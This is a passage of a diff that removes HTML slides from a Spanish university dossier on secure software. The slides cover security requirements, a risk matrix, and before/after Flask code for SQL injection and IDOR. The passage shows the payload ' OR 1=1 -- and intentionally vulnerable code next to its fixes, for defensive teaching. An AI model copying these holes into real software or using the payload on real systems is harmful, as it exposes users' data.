-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Trazabilidad de Requisitos</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <p class="text-slate-600 text-sm mb-4">
-      Requisitos formalizados con identificador único, categorización según taxonomía de debilidades (CWE) y prueba automatizada de aceptación:
-    </p>
-
-    <div class="bg-white rounded-2xl shadow-md overflow-hidden border border-slate-200">
-      <table class="table-modern">
-        <thead>
-          <tr>
-            <th class="w-24">ID</th>
-            <th>Requisito de Seguridad</th>
-            <th class="w-44">Amenaza Asociada</th>
-            <th class="w-24 text-center">CWE</th>
-            <th class="w-32 text-center">Prioridad</th>
-            <th>Criterio & Prueba de Aceptación</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td><span class="font-mono font-bold text-blue-700 text-base">RS-01</span></td>
-            <td>
-              <p class="font-bold text-slate-800 text-base">Control Estricto Anti-IDOR</p>
-              <p class="text-xs text-slate-500 mt-1">El sistema debe validar fehacientemente que el usuario autenticado sea el propietario legítimo del recurso antes de permitir cualquier actualización o eliminación.</p>
-            </td>
-            <td>
-              <span class="inline-block bg-slate-100 text-slate-700 px-2.5 py-1 rounded text-xs font-semibold">Elevation of Privilege</span>
-            </td>
-            <td class="text-center font-mono font-bold text-red-600">CWE-284</td>
-            <td class="text-center">
-              <span class="bg-red-100 text-red-700 border border-red-300 font-bold px-3 py-1 rounded-full text-xs">CRÍTICA</span>
-            </td>
-            <td>
-              <p class="text-xs font-semibold text-slate-700">Solicitar DELETE/PUT sobre recurso ajeno retorna HTTP 403 Forbidden.</p>
-              <p class="text-[0.7rem] font-mono text-emerald-600 mt-0.5">Verificado en test_security.py :: test_03_idor</p>
-            </td>
-          </tr>
-
-          <tr>
-            <td><span class="font-mono font-bold text-blue-700 text-base">RS-02</span></td>
-            <td>
-              <p class="font-bold text-slate-800 text-base">Inmunidad a Inyección SQL</p>
-              <p class="text-xs text-slate-500 mt-1">Ninguna consulta hacia la base de datos SQLite puede construirse concatenando o interpolando variables ingresadas por el cliente.</p>
-            </td>
-            <td>
-              <span class="inline-block bg-slate-100 text-slate-700 px-2.5 py-1 rounded text-xs font-semibold">Tampering / Data Breach</span>
-            </td>
-            <td class="text-center font-mono font-bold text-red-600">CWE-89</td>
-            <td class="text-center">
-              <span class="bg-red-100 text-red-700 border border-red-300 font-bold px-3 py-1 rounded-full text-xs">CRÍTICA</span>
-            </td>
-            <td>
-              <p class="text-xs font-semibold text-slate-700">Búsqueda con payload ' OR 1=1 -- es tratada como texto plano y retorna [].</p>
-              <p class="text-[0.7rem] font-mono text-emerald-600 mt-0.5">Verificado en test_security.py :: test_17_sqli</p>
-            </td>
-          </tr>
-
-          <tr>
-            <td><span class="font-mono font-bold text-blue-700 text-base">RS-03</span></td>
-            <td>
-              <p class="font-bold text-slate-800 text-base">Cifrado de Credenciales con bcrypt</p>
-              <p class="text-xs text-slate-500 mt-1">Las contraseñas de los usuarios deben procesarse mediante función de derivación de claves robusta (bcrypt) con salt aleatorio y factor de costo 12.</p>
-            </td>
-            <td>
-              <span class="inline-block bg-slate-100 text-slate-700 px-2.5 py-1 rounded text-xs font-semibold">Information Disclosure</span>
-            </td>
-            <td class="text-center font-mono font-bold text-red-600">CWE-256</td>
-            <td class="text-center">
-              <span class="bg-red-100 text-red-700 border border-red-300 font-bold px-3 py-1 rounded-full text-xs">CRÍTICA</span>
-            </td>
-            <td>
-              <p class="text-xs font-semibold text-slate-700">El valor almacenado en BD inicia obligatoriamente con el prefijo $2b$12$.</p>
-              <p class="text-[0.7rem] font-mono text-emerald-600 mt-0.5">Verificado en test_security.py :: test_01_register</p>
-            </td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 7 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 8: REQUISITOS DE SEGURIDAD (PARTE 2)
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🔒</span>
-      <h2 class="text-xl font-bold tracking-wide">2. Requisitos de Seguridad Verificables (RS-04 y RS-05)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Trazabilidad de Requisitos</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="bg-white rounded-2xl shadow-md overflow-hidden border border-slate-200 mb-6">
-      <table class="table-modern">
-        <thead>
-          <tr>
-            <th class="w-24">ID</th>
-            <th>Requisito de Seguridad</th>
-            <th class="w-44">Amenaza Asociada</th>
-            <th class="w-24 text-center">CWE</th>
-            <th class="w-32 text-center">Prioridad</th>
-            <th>Criterio & Prueba de Aceptación</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td><span class="font-mono font-bold text-blue-700 text-base">RS-04</span></td>
-            <td>
-              <p class="font-bold text-slate-800 text-base">Rate Limiting Progresivo Anti-Fuerza Bruta</p>
-              <p class="text-xs text-slate-500 mt-1">El endpoint de inicio de sesión debe mitigar ataques automáticos de diccionario bloqueando temporalmente tras 3 intentos fallidos consecutivos (30s y 180s acumulativos).</p>
-            </td>
-            <td>
-              <span class="inline-block bg-slate-100 text-slate-700 px-2.5 py-1 rounded text-xs font-semibold">DoS / Credential Stuffing</span>
-            </td>
-            <td class="text-center font-mono font-bold text-amber-600">CWE-307</td>
-            <td class="text-center">
-              <span class="bg-amber-100 text-amber-800 border border-amber-300 font-bold px-3 py-1 rounded-full text-xs">ALTA</span>
-            </td>
-            <td>
-              <p class="text-xs font-semibold text-slate-700">El cuarto intento fallido retorna inmediatamente HTTP 429 con cabecera retry-after.</p>
-              <p class="text-[0.7rem] font-mono text-emerald-600 mt-0.5">Verificado en test_security.py :: test_06_brute</p>
-            </td>
-          </tr>
-
-          <tr>
-            <td><span class="font-mono font-bold text-blue-700 text-base">RS-05</span></td>
-            <td>
-              <p class="font-bold text-slate-800 text-base">Revocación Global de Sesiones (token_version)</p>
-              <p class="text-xs text-slate-500 mt-1">Al producirse un cambio o restablecimiento de contraseña, el sistema debe invalidar de inmediato todos los tokens JWT emitidos con anterioridad.</p>
-            </td>
-            <td>
-              <span class="inline-block bg-slate-100 text-slate-700 px-2.5 py-1 rounded text-xs font-semibold">Session Hijacking / Replay</span>
-            </td>
-            <td class="text-center font-mono font-bold text-amber-600">CWE-613</td>
-            <td class="text-center">
-              <span class="bg-amber-100 text-amber-800 border border-amber-300 font-bold px-3 py-1 rounded-full text-xs">ALTA</span>
-            </td>
-            <td>
-              <p class="text-xs font-semibold text-slate-700">Presentar el token previo tras actualizar contraseña genera HTTP 401 Unauthorized.</p>
-              <p class="text-[0.7rem] font-mono text-emerald-600 mt-0.5">Verificado en test_security.py :: test_09_revoke</p>
-            </td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-
-    <div class="grid grid-cols-3 gap-6">
-      <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 flex items-center gap-3">
-        <span class="text-2xl">🎯</span>
-        <div>
-          <p class="text-xs font-bold text-blue-900 uppercase">Verificabilidad</p>
-          <p class="text-xs text-blue-700">Todos los requisitos poseen un test automatizado con aserciones rigurosas.</p>
-        </div>
-      </div>
-      <div class="bg-emerald-50 border border-emerald-200 rounded-xl p-4 flex items-center gap-3">
-        <span class="text-2xl">🛡️</span>
-        <div>
-          <p class="text-xs font-bold text-emerald-900 uppercase">Defensa en Profundidad</p>
-          <p class="text-xs text-emerald-700">Controles implementados en capas de red, middleware, servicio y BD.</p>
-        </div>
-      </div>
-      <div class="bg-slate-100 border border-slate-300 rounded-xl p-4 flex items-center gap-3">
-        <span class="text-2xl">📋</span>
-        <div>
-          <p class="text-xs font-bold text-slate-900 uppercase">Cumplimiento OWASP</p>
-          <p class="text-xs text-slate-700">Cubre directamente A01, A02, A03 y A07 del OWASP Top 10.</p>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 8 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 9: MATRIZ DE RIESGOS - MAPA DE CALOR
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">⚠️</span>
-      <h2 class="text-xl font-bold tracking-wide">3. Matriz de Riesgos — Mapa de Calor P × I</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Evaluación Cuantitativa</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex items-center max-w-7xl mx-auto w-full">
-    <div class="grid grid-cols-12 gap-8 w-full items-center">
-      
-      <!-- LADO IZQUIERDO: MAPA DE CALOR GIGANTE -->
-      <div class="col-span-7 bg-white rounded-2xl p-6 shadow-md border border-slate-200">
-        <h4 class="font-bold text-slate-800 text-sm uppercase tracking-wider mb-4 flex items-center justify-between">
-          <span>Distribución de Amenazas (Probabilidad vs Impacto)</span>
-          <span class="text-xs text-slate-400 font-mono">Escala 1 a 5</span>
-        </h4>
-
-        <div class="grid grid-cols-6 gap-2 text-center font-mono">
-          <!-- Headers -->
-          <div class="text-slate-400 font-bold py-2 text-xs">P \ I</div>
-          <div class="text-slate-600 font-bold py-2 text-xs">1 (Bajo)</div>
-          <div class="text-slate-600 font-bold py-2 text-xs">2 (Menor)</div>
-          <div class="text-slate-600 font-bold py-2 text-xs">3 (Medio)</div>
-          <div class="text-slate-600 font-bold py-2 text-xs">4 (Mayor)</div>
-          <div class="text-slate-600 font-bold py-2 text-xs">5 (Crítico)</div>
-
-          <!-- P=5 -->
-          <div class="text-slate-600 font-bold py-2.5 text-xs flex items-center justify-center">5</div>
-          <div class="bg-amber-100 text-amber-800 font-bold rounded-lg flex items-center justify-center text-xs">5</div>
-          <div class="bg-amber-200 text-amber-900 font-bold rounded-lg flex items-center justify-center text-xs">10</div>
-          <div class="bg-orange-300 text-orange-950 font-bold rounded-lg flex items-center justify-center text-xs">15</div>
-          <div class="bg-red-400 text-white font-bold rounded-lg flex items-center justify-center text-xs">20</div>
-          <div class="bg-red-600 text-white font-black rounded-lg flex items-center justify-center text-xs">25</div>
-
-          <!-- P=4 -->
-          <div class="text-slate-600 font-bold py-2.5 text-xs flex items-center justify-center">4</div>
-          <div class="bg-emerald-100 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">4</div>
-          <div class="bg-amber-100 text-amber-800 font-bold rounded-lg flex items-center justify-center text-xs">8</div>
-          <div class="bg-amber-200 text-amber-900 font-bold rounded-lg flex items-center justify-center text-xs">12</div>
-          <!-- AM-02, AM-03 -->
-          <div class="bg-red-500 text-white font-black rounded-lg flex flex-col items-center justify-center text-xs shadow-md ring-2 ring-red-700">
-            <span>16</span>
-            <span class="text-[0.6rem] bg-white/30 px-1 rounded mt-0.5">AM-02, AM-03</span>
-          </div>
-          <!-- AM-01 -->
-          <div class="bg-red-600 text-white font-black rounded-lg flex flex-col items-center justify-center text-xs shadow-md ring-2 ring-red-800">
-            <span>20</span>
-            <span class="text-[0.6rem] bg-white/30 px-1 rounded mt-0.5">AM-01</span>
-          </div>
-
-          <!-- P=3 -->
-          <div class="text-slate-600 font-bold py-2.5 text-xs flex items-center justify-center">3</div>
-          <div class="bg-emerald-50 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">3</div>
-          <div class="bg-emerald-100 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">6</div>
-          <!-- AM-05 -->
-          <div class="bg-amber-300 text-amber-950 font-bold rounded-lg flex flex-col items-center justify-center text-xs ring-2 ring-amber-500">
-            <span>9</span>
-            <span class="text-[0.6rem] bg-black/10 px-1 rounded mt-0.5">AM-05</span>
-          </div>
-          <div class="bg-amber-200 text-amber-900 font-bold rounded-lg flex items-center justify-center text-xs">12</div>
-          <!-- AM-04 -->
-          <div class="bg-red-400 text-white font-black rounded-lg flex flex-col items-center justify-center text-xs shadow-sm ring-2 ring-red-600">
-            <span>15</span>
-            <span class="text-[0.6rem] bg-white/30 px-1 rounded mt-0.5">AM-04</span>
-          </div>
-
-          <!-- P=2 -->
-          <div class="text-slate-600 font-bold py-2.5 text-xs flex items-center justify-center">2</div>
-          <div class="bg-emerald-50 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">2</div>
-          <div class="bg-emerald-100 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">4</div>
-          <div class="bg-emerald-100 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">6</div>
-          <div class="bg-amber-100 text-amber-800 font-bold rounded-lg flex items-center justify-center text-xs">8</div>
-          <div class="bg-amber-200 text-amber-900 font-bold rounded-lg flex items-center justify-center text-xs">10</div>
-
-          <!-- P=1 -->
-          <div class="text-slate-600 font-bold py-2.5 text-xs flex items-center justify-center">1</div>
-          <div class="bg-emerald-50 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">1</div>
-          <div class="bg-emerald-50 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">2</div>
-          <div class="bg-emerald-50 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">3</div>
-          <div class="bg-emerald-100 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">4</div>
-          <div class="bg-emerald-100 text-emerald-800 font-bold rounded-lg flex items-center justify-center text-xs">5</div>
-        </div>
-      </div>
-
-      <!-- LADO DERECHO: INTERPRETACIÓN Y LEYENDA -->
-      <div class="col-span-5 space-y-4">
-        <div class="bg-white rounded-2xl p-5 shadow-md border border-slate-200">
-          <h4 class="font-bold text-slate-800 text-sm uppercase tracking-wider mb-3">Niveles de Severidad</h4>
-          <div class="space-y-2.5">
-            <div class="flex items-center justify-between p-2.5 rounded-lg bg-red-50 border border-red-200">
-              <div class="flex items-center gap-2">
-                <span class="w-3.5 h-3.5 rounded-full bg-red-600"></span>
-                <span class="text-xs font-bold text-red-900">Crítico (Score ≥ 16)</span>
-              </div>
-              <span class="text-xs font-bold text-red-700">Inaceptable</span>
-            </div>
-            <div class="flex items-center justify-between p-2.5 rounded-lg bg-orange-50 border border-orange-200">
-              <div class="flex items-center gap-2">
-                <span class="w-3.5 h-3.5 rounded-full bg-orange-500"></span>
-                <span class="text-xs font-bold text-orange-900">Alto (Score 13 – 15)</span>
-              </div>
-              <span class="text-xs font-bold text-orange-700">Mitigación Inmediata</span>
-            </div>
-            <div class="flex items-center justify-between p-2.5 rounded-lg bg-amber-50 border border-amber-200">
-              <div class="flex items-center gap-2">
-                <span class="w-3.5 h-3.5 rounded-full bg-amber-400"></span>
-                <span class="text-xs font-bold text-amber-900">Medio (Score 9 – 12)</span>
-              </div>
-              <span class="text-xs font-bold text-amber-700">Monitoreo Activo</span>
-            </div>
-            <div class="flex items-center justify-between p-2.5 rounded-lg bg-emerald-50 border border-emerald-200">
-              <div class="flex items-center gap-2">
-                <span class="w-3.5 h-3.5 rounded-full bg-emerald-500"></span>
-                <span class="text-xs font-bold text-emerald-900">Bajo (Score 1 – 8)</span>
-              </div>
-              <span class="text-xs font-bold text-emerald-700">Riesgo Tolerable</span>
-            </div>
-          </div>
-        </div>
-
-        <div class="bg-blue-50 border border-blue-200 rounded-2xl p-4 text-xs text-blue-900">
-          <p class="font-bold mb-1">Cálculo de Riesgo:</p>
-          <p class="text-blue-700 leading-relaxed font-mono">Nivel de Riesgo (R) = Probabilidad (P) × Impacto (I)</p>
-          <p class="text-slate-600 text-[0.72rem] mt-1">El 80% de las amenazas identificadas se ubican en la zona de intervención crítica o alta.</p>
-        </div>
-      </div>
-
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 9 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 10: MATRIZ DE RIESGOS - TABLA DETALLADA
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">⚠️</span>
-      <h2 class="text-xl font-bold tracking-wide">3. Matriz de Riesgos — Tratamiento y Asignación de Responsables</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">Plan de Mitigación</span>
-  </div>
-
-  <div class="flex-1 px-16 py-8 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="bg-white rounded-2xl shadow-md overflow-hidden border border-slate-200">
-      <table class="table-modern">
-        <thead>
-          <tr>
-            <th class="w-20">ID</th>
-            <th>Amenaza de Seguridad</th>
-            <th class="w-32">STRIDE</th>
-            <th class="w-12 text-center">P</th>
-            <th class="w-12 text-center">I</th>
-            <th class="w-16 text-center">Riesgo</th>
-            <th class="w-28 text-center">Nivel</th>
-            <th>Estrategia de Tratamiento</th>
-            <th class="w-36">Responsable</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td><span class="font-mono font-bold text-red-600">AM-01</span></td>
-            <td>
-              <p class="font-bold text-slate-800">Inyección de Código SQL</p>
-              <p class="text-xs text-slate-500">Manipulación directa del motor de base de datos.</p>
-            </td>
-            <td class="text-xs font-semibold text-slate-700">Tampering</td>
-            <td class="text-center font-bold text-red-600">4</td>
-            <td class="text-center font-bold text-red-600">5</td>
-            <td class="text-center font-black text-red-600 font-mono text-base">20</td>
-            <td class="text-center">
-              <span class="bg-red-600 text-white font-black px-2.5 py-0.5 rounded-full text-xs">CRÍTICO</span>
-            </td>
-            <td class="text-xs text-slate-700"><strong>Mitigar:</strong> Parametrización total con Prepared Statements.</td>
-            <td class="text-xs font-semibold text-slate-700">Dev Backend</td>
-          </tr>
-
-          <tr>
-            <td><span class="font-mono font-bold text-red-600">AM-02</span></td>
-            <td>
-              <p class="font-bold text-slate-800">Acceso a Tareas Ajenas (IDOR)</p>
-              <p class="text-xs text-slate-500">Visualización/modificación de recursos sin validación de ownership.</p>
-            </td>
-            <td class="text-xs font-semibold text-slate-700">Elev. Privilege</td>
-            <td class="text-center font-bold text-red-600">4</td>
-            <td class="text-center font-bold text-red-600">4</td>
-            <td class="text-center font-black text-red-600 font-mono text-base">16</td>
-            <td class="text-center">
-              <span class="bg-red-600 text-white font-black px-2.5 py-0.5 rounded-full text-xs">CRÍTICO</span>
-            </td>
-            <td class="text-xs text-slate-700"><strong>Mitigar:</strong> Verificación obligatoria de <code class="font-mono text-[0.7rem]">owner_id == user_id</code>.</td>
-            <td class="text-xs font-semibold text-slate-700">Dev Backend</td>
-          </tr>
-
-          <tr>
-            <td><span class="font-mono font-bold text-red-600">AM-03</span></td>
-            <td>
-              <p class="font-bold text-slate-800">Fuerza Bruta contra Endpoint Login</p>
-              <p class="text-xs text-slate-500">Descifrado de contraseñas por ataques de diccionario masivos.</p>
-            </td>
-            <td class="text-xs font-semibold text-slate-700">DoS / Spoofing</td>
-            <td class="text-center font-bold text-red-600">4</td>
-            <td class="text-center font-bold text-red-600">4</td>
-            <td class="text-center font-black text-red-600 font-mono text-base">16</td>
-            <td class="text-center">
-              <span class="bg-red-600 text-white font-black px-2.5 py-0.5 rounded-full text-xs">CRÍTICO</span>
-            </td>
-            <td class="text-xs text-slate-700"><strong>Mitigar:</strong> Rate Limiter progresivo en memoria (IP y cuenta).</td>
-            <td class="text-xs font-semibold text-slate-700">Dev Backend</td>
-          </tr>
-
-          <tr>
-            <td><span class="font-mono font-bold text-orange-600">AM-04</span></td>
-            <td>
-              <p class="font-bold text-slate-800">Reutilización de Tokens de Reseteo</p>
-              <p class="text-xs text-slate-500">Uso recurrente del mismo token de recuperación de contraseña.</p>
-            </td>
-            <td class="text-xs font-semibold text-slate-700">Spoofing</td>
-            <td class="text-center font-bold text-orange-600">3</td>
-            <td class="text-center font-bold text-red-600">5</td>
-            <td class="text-center font-black text-orange-600 font-mono text-base">15</td>
-            <td class="text-center">
-              <span class="bg-orange-500 text-white font-bold px-2.5 py-0.5 rounded-full text-xs">ALTO</span>
-            </td>
-            <td class="text-xs text-slate-700"><strong>Mitigar:</strong> Token único SHA-256 consumible y caducidad de 1h.</td>
-            <td class="text-xs font-semibold text-slate-700">Dev Backend</td>
-          </tr>
-
-          <tr>
-            <td><span class="font-mono font-bold text-amber-600">AM-05</span></td>
-            <td>
-              <p class="font-bold text-slate-800">Cross-Site Scripting Reflejado (XSS)</p>
-              <p class="text-xs text-slate-500">Inyección de payloads HTML/JS en respuestas dinámicas.</p>
-            </td>
-            <td class="text-xs font-semibold text-slate-700">Tampering</td>
-            <td class="text-center font-bold text-amber-600">3</td>
-            <td class="text-center font-bold text-amber-600">3</td>
-            <td class="text-center font-black text-amber-600 font-mono text-base">9</td>
-            <td class="text-center">
-              <span class="bg-amber-500 text-white font-bold px-2.5 py-0.5 rounded-full text-xs">MEDIO</span>
-            </td>
-            <td class="text-xs text-slate-700"><strong>Mitigar:</strong> Sanitización de salidas con <code class="font-mono text-[0.7rem]">markupsafe.escape()</code>.</td>
-            <td class="text-xs font-semibold text-slate-700">Dev Frontend / Fullstack</td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 10 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 11: CÓDIGO SEGURO - SQL INJECTION
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🔴</span>
-      <h2 class="text-xl font-bold tracking-wide">4. Propuesta de Código Seguro — Inyección SQL (CWE-89)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">SAST: Bandit B608</span>
-  </div>
-
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="mb-4">
-      <p class="text-slate-600 text-sm">
-        <strong>Vulnerabilidad Identificada:</strong> Interpolación directa mediante formatted strings (<code class="font-mono">f"SELECT... {user_id}"</code>) en <code class="font-mono text-xs bg-slate-200 px-1 py-0.5 rounded">app_vulnerable.py (L49)</code>.
-      </p>
-    </div>
-
-    <div class="grid grid-cols-2 gap-6 items-stretch">
-      <!-- ANTES -->
-      <div class="bg-white rounded-2xl p-5 shadow-md border-l-4 border-red-500 flex flex-col justify-between">
-        <div>
-          <div class="flex items-center justify-between mb-3">
-            <span class="text-xs font-bold text-red-600 uppercase tracking-wider flex items-center gap-1.5">
-              <span>❌</span> Código Vulnerable (Antes)
-            </span>
-            <span class="text-[0.7rem] bg-red-100 text-red-700 font-mono px-2 py-0.5 rounded">app_vulnerable.py</span>
-          </div>
-
-          <div class="code-container"><span class="cmt"># ⚠️ Bandit B608: Inyección SQL detectada</span>
-<span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/tareas"</span>)
-<span class="kw">def</span> <span class="fn">listar_tareas</span>():
-    user_id = request.args.<span class="fn">get</span>(<span class="str">"user_id"</span>)
-
-    <span class="cmt"># ⛔ PELIGRO: Concatena input directo en SQL</span>
-    <span class="bad">query = f"SELECT * FROM tareas WHERE user_id = {user_id}"</span>
-    cur.<span class="fn">execute</span>(query)
-    <span class="kw">return</span> <span class="fn">jsonify</span>(cur.<span class="fn">fetchall</span>())</div>
-        </div>
-
-        <div class="mt-4 bg-red-50 rounded-xl p-3 text-xs text-red-800 border border-red-200">
-          <strong>Impacto:</strong> Con el parámetro <code class="font-mono font-bold">' OR 1=1 --</code> el atacante salta la condición y extrae las tareas privadas de toda la organización.
-        </div>
-      </div>
-
-      <!-- DESPUÉS -->
-      <div class="bg-white rounded-2xl p-5 shadow-md border-l-4 border-emerald-500 flex flex-col justify-between">
-        <div>
-          <div class="flex items-center justify-between mb-3">
-            <span class="text-xs font-bold text-emerald-700 uppercase tracking-wider flex items-center gap-1.5">
-              <span>✅</span> Código Seguro Refactorizado (Después)
-            </span>
-            <span class="text-[0.7rem] bg-emerald-100 text-emerald-800 font-mono px-2 py-0.5 rounded">app_segura.py / main.py</span>
-          </div>
-
-          <div class="code-container"><span class="cmt"># ✅ Prepared Statement con parámetros aislados</span>
-<span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/tareas"</span>)
-<span class="kw">def</span> <span class="fn">listar_tareas</span>():
-    user_id = request.args.<span class="fn">get</span>(<span class="str">"user_id"</span>)
-
-    <span class="cmt"># 🛡️ DEFENSIVO: Placeholder ? separa código de datos</span>
-    <span class="good">cur.execute(
-        "SELECT * FROM tareas WHERE user_id = ?",
-        (user_id,)
-    )</span>
-    <span class="kw">return</span> <span class="fn">jsonify</span>(cur.<span class="fn">fetchall</span>())</div>
-        </div>
-
-        <div class="mt-4 bg-emerald-50 rounded-xl p-3 text-xs text-emerald-900 border border-emerald-200">
-          <strong>Solución Defensiva:</strong> El compilador SQLite precompila la estructura SQL. El input del usuario se procesa como dato literal puro sin poder modificar la lógica.
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 11 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 12: CÓDIGO SEGURO - IDOR
-═══════════════════════════════════════════════════════════ -->
-<div class="slide">
-  <div class="slide-header">
-    <div class="flex items-center gap-3">
-      <span class="text-2xl">🟠</span>
-      <h2 class="text-xl font-bold tracking-wide">4. Propuesta de Código Seguro — IDOR / Broken Access Control (CWE-284)</h2>
-    </div>
-    <span class="text-sm bg-white/20 px-3 py-1 rounded-full font-semibold">SAST: Pylint W0612</span>
-  </div>
-
-  <div class="flex-1 px-16 py-6 flex flex-col justify-center max-w-7xl mx-auto w-full">
-    <div class="mb-4">
-      <p class="text-slate-600 text-sm">
-        <strong>Vulnerabilidad Identificada:</strong> Pylint detectó la advertencia <code class="font-mono text-xs bg-slate-200 px-1 py-0.5 rounded">W0612 (unused-variable user_id_session)</code> evidenciando que se obtenía el usuario de la sesión pero jamás se contrastaba contra el dueño de la tarea.
-      </p>
-    </div>
-
-    <div class="grid grid-cols-2 gap-6 items-stretch">
-      <!-- ANTES -->
-      <div class="bg-white rounded-2xl p-5 shadow-md border-l-4 border-red-500 flex flex-col justify-between">
-        <div>
-          <div class="flex items-center justify-between mb-3">
-            <span class="text-xs font-bold text-red-600 uppercase tracking-wider flex items-center gap-1.5">
-              <span>❌</span> Código Vulnerable (Antes)
-            </span>
-            <span class="text-[0.7rem] bg-red-100 text-red-700 font-mono px-2 py-0.5 rounded">app_vulnerable.py</span>
-          </div>
-
-          <div class="code-container"><span class="cmt"># ⚠️ Pylint W0612: Variable sin utilizar</span>
-<span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/tareas/&lt;int:id&gt;"</span>, methods=[<span class="str">"DELETE"</span>])
-<span class="kw">def</span> <span class="fn">eliminar_tarea</span>(id):
-    <span class="bad">user_id_session = session.get("user_id")</span> <span class="cmt"># Se obtiene</span>
-    
-    <span class="cmt"># ⛔ NUNCA SE VERIFICA PROPIEDAD</span>
-    cur.<span class="fn">execute</span>(<span class="str">"DELETE FROM tareas WHERE id = ?"</span>, (id,))
-    db.<span class="fn">commit</span>()
-    <span class="kw">return</span> <span class="fn">jsonify</span>({<span class="str">"msg"</span>: <span class="str">"Eliminado"</span>})</div>
-        </div>
-
-        <div class="mt-4 bg-red-50 rounded-xl p-3 text-xs text-red-800 border border-red-200">
-          <strong>Impacto:</strong> Cualquier usuario autenticado podía eliminar o modificar tareas ajenas con solo iterar números correlativos en la URL (/tareas/1, /tareas/2).
-        </div>
-      </div>
-
-      <!-- DESPUÉS -->
-      <div class="bg-white rounded-2xl p-5 shadow-md border-l-4 border-emerald-500 flex flex-col justify-between">
-        <div>
-          <div class="flex items-center justify-between mb-3">
-            <span class="text-xs font-bold text-emerald-700 uppercase tracking-wider flex items-center gap-1.5">
-              <span>✅</span> Código Seguro Refactorizado (Después)
-            </span>
-            <span class="text-[0.7rem] bg-emerald-100 text-emerald-800 font-mono px-2 py-0.5 rounded">app_segura.py / main.py</span>
-          </div>
-
-          <div class="code-container"><span class="cmt"># ✅ Verificación previa de pertenencia (Anti-IDOR)</span>
-<span class="kw">@app</span>.<span class="fn">route</span>(<span class="str">"/tareas/&lt;int:id&gt;"</span>, methods=[<span class="str">"DELETE"</span>])
-<span class="kw">def</span> <span class="fn">eliminar_tarea</span>(id):
-    user_id = session.<span class="fn">get</span>(<span class="str">"user_id"</span>)
-    tarea = cur.<span class="fn">execute</span>(
-        <span class="str">"SELECT owner_id FROM tareas WHERE id = ?"</span>, (id,)
-    ).<span class="fn">fetchone</span>()
-
-    <span class="good">if not tarea or tarea["owner_id"] != user_id:
-        abort(403)  # HTTP 403 Forbidden estricto</span>
-
-    cur.<span class="fn">execute</span>(<span class="str">"DELETE FROM tareas WHERE id = ?"</span>, (id,))</div>
-        </div>
-
-        <div class="mt-4 bg-emerald-50 rounded-xl p-3 text-xs text-emerald-900 border border-emerald-200">
-          <strong>Solución Defensiva:</strong> Control de acceso a nivel de fila (Row-Level Security). Si el ID de sesión no coincide exactamente con el dueño, el servidor deniega la acción con código HTTP 403.
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>Mini Dossier de Software Seguro • UNSAAC</span>
-    <span>Slide 12 / 24</span>
-  </div>
-</div>
-
-<!-- ══════════════════════════════════════════════════════════
-     SLIDE 13: CÓDIGO SEGURO - XSS
-═══════════════════════════════════════════════════════════ -->
